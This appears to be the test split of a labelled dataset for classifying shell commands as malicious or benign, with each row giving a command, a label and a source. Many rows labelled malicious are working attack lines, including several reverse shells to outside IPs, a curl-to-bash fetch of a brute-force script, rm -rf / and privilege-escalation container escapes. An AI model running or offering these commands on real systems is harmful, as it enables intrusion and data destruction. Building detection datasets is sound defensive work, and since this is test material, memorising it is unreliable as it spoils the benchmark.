id,command,label,source,split
d1_001841,which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null,1,hacktricks,test
d1_001842,"grep -c ""failure"" /var/log/*.log",0,bash6k,test
d1_001843,yay -S buildbot,0,linlm,test
d1_001845,/opt/splunk/etc/apps/.linux_audit/,1,hacktricks,test
d1_001854,wget -i /path/to/input-file -o /path/to/output-file,1,gtfobins,test
d1_001858,chmod go-w event.log,0,bash_instruct,test
d1_001870,home-manager command --flake path/to/flake,0,tldr,test
d1_001875,tshark -Xlua_script:/path/to/temp-file,1,gtfobins,test
d1_001882,sudo chown el my_test_expect.exp,0,nl2bash,test
d1_001884,pvesm [f|free] local:iso/archlinux-2025.08.01-x86_64.iso,0,tldr,test
d1_001890,tldr ruff format,0,tldr,test
d1_001891,Slice=system.slice,1,hacktricks,test
d1_001893,cat catalog.ini | wc -l,0,bash_instruct,test
d1_001896,sudo pacman -S amarok,0,linlm,test
d1_001906,curl -s https://h3cf88e0a.example.net/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash,1,atomic_red_team,test
d1_001908,lsof +D /lib,1,hacktricks,test
d1_001909,file output.old,0,bash_instruct,test
d1_001913,find -inum 16187430 -exec mv {} new-test-file-name \,0,nl2bash,test
d1_001915,pg_walsummary [-i|--individual] path/to/file,0,tldr,test
d1_001918,useradd -u 1000 standarduser,1,hacktricks,test
d1_001923,"mkdir -p /tmp/project/{src,bin,doc}",0,bash6k,test
d1_001932,mv export.xml export.xml.old,0,bash_instruct,test
d1_001941,someCommand | tee someFile,0,nl2bash,test
d1_001942,"kubectl run atomic-at-schedule --image=ubuntu --restart=Never --attach --rm -i -- bash -lc ""apt-get update -y >/dev/null 2>&1 && apt-get install -y at >/dev/null 2>&1 && (atd || /usr/sbin/atd) && echo 'echo Hello from Atomic Red Team' | at now + 1 minute && at -l""",1,atomic_red_team,test
d1_001943,sudo chown ec2-user invoice.tar.gz,0,bash_instruct,test
d1_001945,find / \( -type f -or -type d \) -name \*fink\* -ls,0,nl2bash,test
d1_001956,cat ~/.ssh/known_hosts,0,linlm,test
d1_001961,top -b -n1 | grep processname,0,nl2bash,test
d1_001969,sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp',1,atomic_red_team,test
d1_001974,"find . -name '*.php' | xargs wc -l | sort -nr | egrep -v ""libs|tmp|tests|vendor"" | less",0,nl2bash,test
d1_001976,adb install -d path/to/file.apk,0,tldr,test
d1_001990,pstree mysql,0,bash_instruct,test
d1_001993,fly targets,0,tldr,test
d1_001997,pip install --break-system-packages .,1,gtfobins,test
d1_002003,scp payment.bak git@backup.example.com:/tmp/,0,bash_instruct,test
d1_002011,echo AC_INIT >configure.ac,1,gtfobins,test
d1_002013,file output.bak,0,bash_instruct,test
d1_002014,echo DATA >output-file,1,gtfobins,test
d1_002019,mkdir -p lib/2026/logs,0,bash_instruct,test
d1_002021,findmnt -t nfs,1,atomic_red_team,test
d1_002023,"perl -e 'use Socket;$cmd_1=""49.91.52.234"";$cmd_2=46860;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""udp""));if(connect(S,sockaddr_in($cmd_1,inet_aton($cmd_2)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/usr/bin/bash -i"");};'",1,quasarnix,test
d1_002030,pgmtopgm,0,tldr,test
d1_002033,shopt -s nullglob extglob,0,nl2bash,test
d1_002051,hostname -I | cut -f1 -d' ',0,nl2bash,test
d1_002057,jstack /usr/bin/java file.core,0,tldr,test
d1_002059,cat manifest.csv | grep -v '^$',0,bash_instruct,test
d1_002063,udiskie-dmenu --rofi,0,tldr,test
d1_002066,find . -type d | xargs rmdir,0,nl2bash,test
d1_002070,koji cancel task_id,0,tldr,test
d1_002073,screen -R -O -t mysession -S mysession -f,0,nl2bash,test
d1_002074,id || (whoami && groups) 2>/dev/null,1,hacktricks,test
d1_002075,pct [se|set] 100 --memory 8192 --cpulimit 4,0,tldr,test
d1_002082,root 2027 2025 0 11:46 ? 00:00:00 authenticator,1,hacktricks,test
d1_002090,"find / -name ""*.core"" | xargs rm",0,nl2bash,test
d1_002093,for fd_dir in /proc/[0-9]*/fd; do,1,hacktricks,test
d1_002094,head -n 1 credentials.yaml,0,bash_instruct,test
d1_002095,who -su | sort | uniq | column,0,nl2bash,test
d1_002097,kldstat,1,atomic_red_team,test
d1_002099,mv *.sql backup/,0,bash_instruct,test
d1_002105,pw-mon [-h|--help],0,tldr,test
d1_002106,cat archive.log | tail -n 15,0,bash_instruct,test
d1_002107,tldr distrobox-list,0,tldr,test
d1_002111,helm get notes release_name,0,linlm,test
d1_002124,find /data/SpoolIn -name job.history | xargs grep -l FAIL | wc -l,0,nl2bash,test
d1_002128,"echo -e ""\n\n\n"" | ssh-keygen -t rsa",0,nl2bash,test
d1_002133,helm repo add repo_name https://haab2cec9.example.net,0,linlm,test
d1_002135,"read -p ""Is this a good question (y/n)? "" answer",0,nl2bash,test
d1_002136,systemctl disable firewalld,0,bash6k,test
d1_002158,sh5util [-j|--jobs] job_id|job_id.step_id [-I|--item-extract] [-s|--series] Energy|Filesystem|Network|Task [-d|--data] data_item,0,tldr,test
d1_002159,find / -maxdepth 10 -name *.php -type f -exec grep -Hn $keyword {} \; 2>/dev/null,1,slp,test
d1_002160,echo '# Hello from Atomic Red Team T1546.004' >> /etc/profile,1,atomic_red_team,test
d1_002163,rm -f old_data.csv,0,bash6k,test
d1_002164,node path/to/file,0,tldr,test
d1_002165,sudo pacman -S fluent-bit,0,linlm,test
d1_002168,egrep -o '$P$S{31}' *.txt > wordpress-md5.txt,1,hacktricks,test
d1_002175,./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name,1,hacktricks,test
d1_002176,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' session.md | sort -u,0,bash_instruct,test
d1_002181,lsb_release -a 2>/dev/null,1,hacktricks,test
d1_002190,sort list.txt | uniq > uniq.txt,0,bash6k,test
d1_002194,lxc init x x -c security.privileged=true,1,gtfobins,test
d1_002195,onedrive,0,linlm,test
d1_002203,cryfs-unmount path/to/mount_point,0,tldr,test
d1_002206,colorls [-a|--all],0,tldr,test
d1_002217,cat test.tsv | tail -n 15,0,bash_instruct,test
d1_002225,tcsh -b,1,gtfobins,test
d1_002226,cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config,1,hacktricks,test
d1_002227,(sleep 1; echo 0 > /tmp/c/cgroup.procs) &,1,hacktricks,test
d1_002246,"echo ""Defaults !tty_tickets"" > /etc/sudoers.d/win",1,hacktricks,test
d1_002247,wol [-p|--port] port_number mac_address,0,tldr,test
d1_002252,sudo chown ubuntu invoice.md,0,bash_instruct,test
d1_002255,git revert -m 1 merge_commit_hash,0,linlm,test
d1_002262,"if selinuxenabled; then echo ""SELinux is running""; fi",0,tldr,test
d1_002272,cat backup.tsv | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_002281,podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current,1,hacktricks,test
d1_002282,locate *,1,atomic_red_team,test
d1_002287,python -m http.server 8000,0,linlm,test
d1_002297,echo $-,0,bash6k,test
d1_002314,tldr test,0,tldr,test
d1_002319,yay -S lychee,0,linlm,test
d1_002320,"echo '{""modules"":[{""type"":""command"",""key"":""x"",""text"":""exec /bin/sh 1>&0 2>&0""}]}' >/path/to/temp-file.jsonc",1,gtfobins,test
d1_002321,resolvectl service _service._protocol name,0,tldr,test
d1_002324,docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head',1,hacktricks,test
d1_002325,cat settings.csv | tail -n 15,0,bash_instruct,test
d1_002326,find /DIR -type f -print0 | tr -dc '\0' | wc -c,0,nl2bash,test
d1_002335,end;,1,gtfobins,test
d1_002342,/bin/dash -i 3<> /dev/tcp/65.27.201.143/3306 0<&3 1>&3 2>&3,1,quasarnix,test
d1_002353,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' release.ini | sort -u,0,bash_instruct,test
d1_002354,"cut -d, -f1-3 data.csv | tr ',' '\t'",0,bash6k,test
d1_002356,tail -n 20 report.zip,0,bash_instruct,test
d1_002359,ps $TARGETPID,1,atomic_red_team,test
d1_002361,[ -f access.zip ] && cat access.zip || echo 'not found',0,bash_instruct,test
d1_002362,smbserver.py -smb2support share .,1,gtfobins,test
d1_002363,atool [-l|--list] path/to/archive.zip,0,tldr,test
d1_002369,"wget --post-data=""msg=AtomicTestT1048.002"" --timeout=5 --no-check-certificate https://h0caaf24a.example.net/ --delete-after",1,atomic_red_team,test
d1_002377,"wacli send text --to phone_number --message ""message"" --store path/to/store",0,tldr,test
d1_002378,time /bin/sh,1,gtfobins,test
d1_002386,"for i in {21,22,80,139,443,445,3306,3389,8080,8443}; do nc -z -w 1 110.39.245.4 $i > /dev/null 2>&1; if [ $? -eq 0 ]; then echo ""110.39.245.4 has port $i open""; fi ; done",1,payloads,test
d1_002389,sprof [-p|--flat-profile] path/to/library.so path/to/library.so.profile,0,tldr,test
d1_002391,touch ./etc/pacman.conf,1,gtfobins,test
d1_002392,ls -d tests/*/,0,bash_instruct,test
d1_002398,pkill packetbeat,0,linlm,test
d1_002405,sudo rusnapshot [-c|--config] path/to/config.toml [-l|--list],0,tldr,test
d1_002420,/usr/bin/vim = cap_dac_override+ep,1,hacktricks,test
d1_002426,journalctl -u mysql --since today --no-pager | grep -c 'DEBUG',0,bash_instruct,test
d1_002434,"csvtool col 3 input.csv | awk -F, '$3>100' | csv2json > output.json",0,bash6k,test
d1_002436,cp credentials.pdf build/,0,bash_instruct,test
d1_002441,zip -r backup.zip /home/user/,0,linlm,test
d1_002453,zellij [a|attach],0,tldr,test
d1_002454,set | grep -P '^\w*X\w*(?==)' | grep -oP '(?<==).*',0,nl2bash,test
d1_002455,pipx run pycowsay moo,0,tldr,test
d1_002465,parquet-tools head path/to/parquet,0,tldr,test
d1_002473,rsync -av config/ images/,0,bash_instruct,test
d1_002480,ls -d scripts/*/,0,bash_instruct,test
d1_002481,systemctl status --failed,0,tldr,test
d1_002489,wc -l request.bak,0,bash_instruct,test
d1_002490,systemctl list-paths --show-types,0,tldr,test
d1_002494,sudo rpi-eeprom-update -a,0,tldr,test
d1_002495,while IFS=: read -r user _ _ _ _ home _; do,0,bash6k,test
d1_002499,waifu2x-ncnn-vulkan -i path/to/input_file -o path/to/output_file -f jpg|png|webp,0,tldr,test
d1_002506,curl -s https://h0caaf24a.example.net/data.json | jq -r '.[] | .key',0,bash6k,test
d1_002508,$@ | tee $FILE,0,nl2bash,test
d1_002512,rev /path/to/input-file | rev,1,gtfobins,test
d1_002514,pct status 100 --verbose,0,tldr,test
d1_002528,journalctl -u rabbitmq --since yesterday | grep -ic error,0,bash_instruct,test
d1_002538,bun update --latest,0,tldr,test
d1_002540,touch error.py,0,bash_instruct,test
d1_002541,adcli testjoin 2>/dev/null,1,hacktricks,test
d1_002549,cat order.tsv | sort -u,0,bash_instruct,test
d1_002551,"tc filter show dev ""$i"" ingress 2>/dev/null",1,hacktricks,test
d1_002557,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' sales.txt | sort -u,0,bash_instruct,test
d1_002558,mkdir -p backup && mv *.log backup/,0,bash6k,test
d1_002565,mv *.csv artifacts/,0,bash_instruct,test
d1_002566,hcloud context,0,tldr,test
d1_002569,"ls -l ""$fd_dir"" 2>/dev/null | sed ""s|^|$fd_dir -> |""",1,hacktricks,test
d1_002572,0<&3;exec 3<>/dev/udp/76.132.177.92/16088; dash <&3 >&3 2>&3,1,quasarnix,test
d1_002575,docker scan hello-world,1,hacktricks,test
d1_002578,paxs [-u|--upgrade-all],0,tldr,test
d1_002582,find /proc -print0 | xargs -0,0,nl2bash,test
d1_002584,wine reg add 'HKEY_CURRENT_USER\path\to\key' /v value_name /t REG_MULTI_SZ /s # /d 'string1#string2#string3',0,tldr,test
d1_002591,"[ ""$(uname)"" = 'FreeBSD' ] && /bin/echo ""#\!/bin/sh"" > ""testdirwithspaceend /init "" && echo 'echo ""print(\""running T1035.006 with space after filename to masquerade init\"")"" | python3.9' >> ""testdirwithspaceend /init "" && echo ""exit"" >> ""testdirwithspaceend /init "" || /usr/bin/echo -e ""%d\na\n#!/usr/bin/perl\nprint \""running T1035.006 with space after filename to masquerade init\\n\"";\nqx/cp \/usr\/bin\/perl 'init '/;\nqx/'.\/init ' -e 'sleep 5'/;\n.\nwq\n"" | ed 'testdirwithspaceend /init ' >/dev/null",1,atomic_red_team,test
d1_002593,yadm gitconfig key.inner-key value,0,tldr,test
d1_002600,rsync -av downloads/ build/,0,bash_instruct,test
d1_002605,sudo pacman -S lua,0,linlm,test
d1_002607,cat auth.csv | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,test
d1_002610,lsusb -t,0,linlm,test
d1_002612,head -n 1 audit.html,0,bash_instruct,test
d1_002624,"awk -F',' 'NR==1{for(i=1;i<=NF;i++)h[i]=$i;next} $3>100{printf ""%s"", (NR==2?""["":""""); printf ""{""; for(i=1;i<=NF;i++) printf ""\""%s\"": \""%s\""%s"", h[i], $i, (i==NF?"""":"" , ""); printf ""}""; if(!getline) printf ""]""; else printf "",""}' data.csv > filtered.json",0,bash6k,test
d1_002635,sudo chgrp users config.json,0,bash_instruct,test
d1_002636,local -A variable=([key_a]=item_a [key_b]=item_b [key_c]=item_c),0,tldr,test
d1_002643,sha512sum [-c|--check] --quiet path/to/file.sha512,0,tldr,test
d1_002657,ksh -x path/to/script.ksh,0,tldr,test
d1_002661,mount | grep shm,1,hacktricks,test
d1_002678,ginsh,1,gtfobins,test
d1_002684,sudo chown git catalog.sh,0,bash_instruct,test
d1_002689,flux build kustomization name --path path/to/kustomization | kubectl apply -f -,0,tldr,test
d1_002690,lrztar [-o|--outfile] path/to/file path/to/directory,0,tldr,test
d1_002696,sudo nft list chains,1,hacktricks,test
d1_002698,eject,0,tldr,test
d1_002710,msgattrib -P /path/to/input-file,1,gtfobins,test
d1_002717,tar -cjf logs.tar.bz2 logs/\n,0,bash6k,test
d1_002721,stylua --indent-type Spaces --quote-style AutoPreferSingle path/to/file_or_directory,0,tldr,test
d1_002726,pkill -9 mongod,0,bash_instruct,test
d1_002729,pw-dump [-r|--remote] remote_name > path/to/dump_file.json,0,tldr,test
d1_002738,mv transaction.sql transaction.sql.old,0,bash_instruct,test
d1_002749,find . -perm 664,0,nl2bash,test
d1_002751,gcov [-f|--function-summaries] path/to/file.cpp,0,tldr,test
d1_002756,sed -i 's/76.132.177.92/admin/g' settings.yaml,0,bash_instruct,test
d1_002758,matlab -nosplash,0,tldr,test
d1_002763,cp payload.gz project/,0,bash_instruct,test
d1_002764,unix2dos [-i|--info] path/to/file,0,tldr,test
d1_002768,"ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x",1,gtfobins,test
d1_002772,bash-4.2$ $ ./a,1,hacktricks,test
d1_002774,cat /sys/kernel/uevent_helper 2>/dev/null,1,hacktricks,test
d1_002777,comm /path/to/input-file /dev/null,1,gtfobins,test
d1_002778,mpv --sub-file=path/to/file,0,tldr,test
d1_002780,"cut -d, -f4 users.csv | sort | uniq -c | sort -nr | head -n 25",0,bash_instruct,test
d1_002783,mamba activate environment_name,0,tldr,test
d1_002784,head -n 1 backup.old,0,bash_instruct,test
d1_002793,du -sh include,0,bash_instruct,test
d1_002803,ls `pwd`/*,0,nl2bash,test
d1_002809,"fold -w ""$COLUMNS"" testfile | wc -l",0,nl2bash,test
d1_002818,sudo slabtop [-o|--once],0,tldr,test
d1_002819,git publish branch_name,0,tldr,test
d1_002822,file changelog.csv,0,bash_instruct,test
d1_002826,install -D path/to/source_file1 path/to/source_file2 ... path/to/destination,0,tldr,test
d1_002831,tail -f dmesg.log,0,bash_instruct,test
d1_002841,ip -d link show type ipvlan,0,linlm,test
d1_002843,cp -u profile.css media/,0,bash_instruct,test
d1_002848,toolbox list,0,tldr,test
d1_002859,rcat 152.120.38.68 8080 -r /usr/bin/bash,1,quasarnix,test
d1_002862,git squash source_branch,0,tldr,test
d1_002878,cat > /etc/cron.daily/backup <<'EOF',1,hacktricks,test
d1_002887,sudo aa-cleanprof [-s|--silent] profile_name,0,tldr,test
d1_002898,"nmap --script-help ""(default or version) and smb)""",1,hacktricks,test
d1_002906,sudo btrbk [-v|--verbose] dryrun,0,tldr,test
d1_002918,urpmi.update medium1 medium2 ...,0,tldr,test
d1_002925,irssi [-c|--connect] irc.example.com [-p|--port] port,0,tldr,test
d1_002926,docker compose down [-v|--volumes],0,tldr,test
d1_002939,mv -n notes.conf notes.conf.old,0,bash_instruct,test
d1_002949,cat `xxd -r -ps <(echo 2f6574632f706173737764)`,1,hacktricks,test
d1_002964,ping -i seconds host,0,tldr,test
d1_002966,cat payment.ini | tr 'a-z' 'A-Z',0,bash_instruct,test
d1_002968,apt-get changelog apt,1,gtfobins,test
d1_002970,chmod go-w account.old,0,bash_instruct,test
d1_002971,aa-status,1,hacktricks,test
d1_002972,cat /etc/pam.d/common-password,1,atomic_red_team,test
d1_002981,ranger-admin reload,0,linlm,test
d1_002992,scriptlive path/to/timing_file path/to/typescript --divisor 2,0,tldr,test
d1_002995,terraform console -var-file path/to/file.tfvars,0,tldr,test
d1_002998,cp $(which sh) $HOME/...,1,atomic_red_team,test
d1_002999,grep -i 'deprecated' mail.log,0,bash_instruct,test
d1_003000,flask routes,0,linlm,test
d1_003003,podman build path/to/directory,0,tldr,test
d1_003011,"pr [-h|--header] ""header"" path/to/file1 path/to/file2 ...",0,tldr,test
d1_003013,lua: os.execute('/bin/sh'),1,slp,test
d1_003021,"sudo /usr/bin/python3 -c 'import os; os.system(""id"")'",1,hacktricks,test
d1_003025,isutf8 [-q|--quiet] path/to/file1 path/to/file2 ...,0,tldr,test
d1_003030,flox init,0,tldr,test
d1_003038,path/to/PalServer.sh -port=8211 -players=1..32,0,tldr,test
d1_003040,sudo systemctl set-environment http_proxy=http://h51a737c8.example.net,0,linlm,test
d1_003046,mv data.sh data.sh.old,0,bash_instruct,test
d1_003048,aur sync package1 package2 ...,0,tldr,test
d1_003055,cp -u invoice.sql lib/,0,bash_instruct,test
d1_003057,mv $file $(echo $file | rev | cut -f2- -d- | rev).pkg,0,nl2bash,test
d1_003064,ssh -N -L 2222:remote.example.com:22 bridge.example.com&,0,nl2bash,test
d1_003068,zabbix_server,0,linlm,test
d1_003069,find / -type f \( -perm -4000 -o -perm -2000 \) -ls,0,nl2bash,test
d1_003085,"find . -type f -not -name ""*.html""",0,nl2bash,test
d1_003099,rcat 75.136.67.109 58668 -r bash,1,quasarnix,test
d1_003107,$(dirname $0),0,nl2bash,test
d1_003112,"[ ""$(uname)"" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null",1,atomic_red_team,test
d1_003116,secure-keep-caps: no (unlocked),1,hacktricks,test
d1_003121,chmod go-w audit.md,0,bash_instruct,test
d1_003122,create function func_name as path.to.package.Func using 'package.jar';,0,tldr,test
d1_003125,find templates -type f -print0 | xargs -0 chmod 644,0,bash_instruct,test
d1_003128,ip link set lo down 2>/dev/null,1,hacktricks,test
d1_003129,docker run --name mysql -e MYSQL_ROOT_PASSWORD=password -d mysql,0,linlm,test
d1_003141,sudo chown -R backup:users images,0,bash_instruct,test
d1_003144,say --input-file filename.txt,0,tldr,test
d1_003145,find /home/david -iname 'index*',0,nl2bash,test
d1_003146,cat schema.yaml | grep -v '^$',0,bash_instruct,test
d1_003157,grep 'denied' output.log,0,bash_instruct,test
d1_003159,stat schema.js,0,bash_instruct,test
d1_003160,fail2ban-client set x unbanip 35.3.122.68,1,gtfobins,test
d1_003166,tr -s ' ' < request.txt,0,bash_instruct,test
d1_003168,"find . \( -type f -exec sudo chmod 664 ""{}"" \; \) , \( -type d -exec sudo chmod 775 ""{}"" \; \)",0,nl2bash,test
d1_003173,rm /tmp/$TMPNAME2,1,payloads,test
d1_003174,mcookie [-f|--file] path/to/file [-m|--max-size] number_of_bytes,0,tldr,test
d1_003177,xxd -l 64 data.conf,0,bash_instruct,test
d1_003180,rm -rf docs,0,bash_instruct,test
d1_003189,sudo dnf module enable package_name:stream,0,tldr,test
d1_003201,nh home repl path/to/flake,0,tldr,test
d1_003202,cat /proc/self/cgroup,1,hacktricks,test
d1_003212,swift script.swift,0,linlm,test
d1_003227,snmpgetnext [-h|--help],0,tldr,test
d1_003229,/tmp/tickey -i,1,hacktricks,test
d1_003241,if [ `which xclip 2>/dev/null` ]; then,1,hacktricks,test
d1_003245,/bin/sh -i >& /dev/udp/210.74.20.96/9001 0>&1,1,quasarnix,test
d1_003253,journalctl -b -1 -p err -o short-iso,1,hacktricks,test
d1_003265,chflags simmutable /tmp/T1222.002.txt,1,atomic_red_team,test
d1_003268,pnpm audit --json > path/to/audit-report.json,0,tldr,test
d1_003271,head -n 10 /etc/passwd,0,bash6k,test
d1_003276,sort schema.csv | uniq -c | sort -nr,0,bash_instruct,test
d1_003281,uniq event.txt,0,bash_instruct,test
d1_003282,find . \( -name AAA -o -name BBB \) -print,0,nl2bash,test
d1_003285,chmod +x transaction.gz,0,bash_instruct,test
d1_003289,docker run --rm -it --pid=host --net=host --privileged -v /:/mnt ubuntu:latest chroot /mnt bashbash,1,hacktricks,test
d1_003291,"read -s -p ""Password: "" password",0,nl2bash,test
d1_003292,tldr aria2c,0,tldr,test
d1_003295,sudo blockdev --getsz /dev/sdXY,0,tldr,test
